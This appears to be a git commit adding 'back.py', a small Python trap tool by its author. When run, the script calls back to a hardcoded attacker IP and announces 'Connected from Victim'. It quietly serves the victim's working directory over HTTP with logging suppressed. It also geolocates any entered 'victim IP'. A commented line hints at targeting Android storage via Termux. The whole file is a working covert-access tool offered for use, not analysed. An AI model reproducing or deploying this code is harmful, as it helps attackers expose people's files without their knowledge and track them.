1807171a82c385d4030c23fe553ba69a018c3188
4n7ru Cyb3r 50ul <87363501+antrucybersoull@users.noreply.github.com>
2022-01-20 17:34:13 +0700

    Add files via upload

---
+++ back.py
@@ -0,0 +1,56 @@
+import http.server
+import socketserver
+import threading
+import _thread
+import socket
+import requests
+import os
+
+
+def reverse():
+        soc = socket.socket()
+        ip="192.168.42.208"
+        port=667
+        soc.connect((ip,port))
+        soc.send(bytes("Connected from Victim","utf-8"))
+        #os.system('termux-setup-storage')
+reverse()
+
+def create_server():
+        class QuietHandler(http.server.SimpleHTTPRequestHandler):
+                def log_message(self, format, *args):
+                        pass
+        with socketserver.TCPServer(("",2002), QuietHandler) as httpd:
+                httpd.serve_forever()
+
+
+_thread.start_new_thread(create_server,())
+
+def web():
+        inp = input("Enter victim IP: ")
+        if inp == 'exit':
+                print('Bye')
+                exit()
+        else:
+                req =requests.get("https://api.hackertarget.com/geoip/?q="+inp)
+                print(req.text)
+
+while True:
+        banner="""
+    _          _                _____                
+   / \   _ __ | |_ _ __ _   _  |_   _| __ __ _ _ __  
+  / _ \ | '_ \| __| '__| | | |   | || '__/ _` | '_ \ 
+ / ___ \| | | | |_| |  | |_| |   | || | | (_| | |_) |
+/_/   \_\_| |_|\__|_|   \__,_|   |_||_|  \__,_| .__/ 
+                               code by Antru  |_| 
+                                              
+         exit For Exit                                    
+                                               """
+        print(banner)
+        web()
+
+         
+         
+                                                    
+         
+
